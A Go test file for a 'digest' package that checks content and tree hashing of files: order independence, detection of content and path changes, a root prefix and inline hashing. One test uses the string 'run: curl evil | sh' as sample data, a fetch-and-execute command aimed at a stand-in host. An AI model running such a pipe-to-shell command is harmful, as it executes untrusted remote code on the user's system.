package digest

import "testing"

func TestSumIsStable(t *testing.T) {
	// SHA-256 of the empty input is a well-known constant.
	const emptySHA = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	if got := Sum(nil); got != emptySHA {
		t.Fatalf("Sum(nil) = %s, want %s", got, emptySHA)
	}
	if got := Sum([]byte{}); got != emptySHA {
		t.Fatalf("Sum(empty) = %s, want %s", got, emptySHA)
	}
}

func TestRootIsOrderIndependent(t *testing.T) {
	a := []FileHash{
		Leaf("b/two.js", []byte("two")),
		Leaf("a/one.js", []byte("one")),
		Leaf("c/three.js", []byte("three")),
	}
	b := []FileHash{
		Leaf("c/three.js", []byte("three")),
		Leaf("a/one.js", []byte("one")),
		Leaf("b/two.js", []byte("two")),
	}
	if Root(a) != Root(b) {
		t.Fatalf("Root must be independent of input order:\n a=%s\n b=%s", Root(a), Root(b))
	}
}

func TestRootDoesNotMutateInput(t *testing.T) {
	in := []FileHash{
		Leaf("z.js", []byte("z")),
		Leaf("a.js", []byte("a")),
	}
	first := in[0].Path
	_ = Root(in)
	if in[0].Path != first {
		t.Fatalf("Root mutated its input slice: in[0].Path = %s, want %s", in[0].Path, first)
	}
}

func TestRootDetectsContentChange(t *testing.T) {
	base := []FileHash{Leaf("index.js", []byte("console.log(1)"))}
	changed := []FileHash{Leaf("index.js", []byte("console.log(2)"))}
	if Root(base) == Root(changed) {
		t.Fatal("Root must change when file content changes")
	}
}

func TestRootDetectsPathChange(t *testing.T) {
	// Same bytes, different path => different tree. A renamed file is a change.
	a := []FileHash{Leaf("a.js", []byte("x"))}
	b := []FileHash{Leaf("b.js", []byte("x"))}
	if Root(a) == Root(b) {
		t.Fatal("Root must change when a file path changes")
	}
}

func TestRootHasPrefix(t *testing.T) {
	got := Root([]FileHash{Leaf("a", []byte("a"))})
	if len(got) <= len(Prefix) || got[:len(Prefix)] != Prefix {
		t.Fatalf("Root() = %q, want %q prefix", got, Prefix)
	}
}

func TestInlineMatchesSingleFileTree(t *testing.T) {
	content := []byte("run: curl evil | sh")
	if Inline(content) != Root([]FileHash{Leaf("<inline>", content)}) {
		t.Fatal("Inline must equal a single-file tree keyed by <inline>")
	}
}

func TestEmptyTreeIsStable(t *testing.T) {
	if Root(nil) != Root([]FileHash{}) {
		t.Fatal("Root(nil) must equal Root(empty)")
	}
}
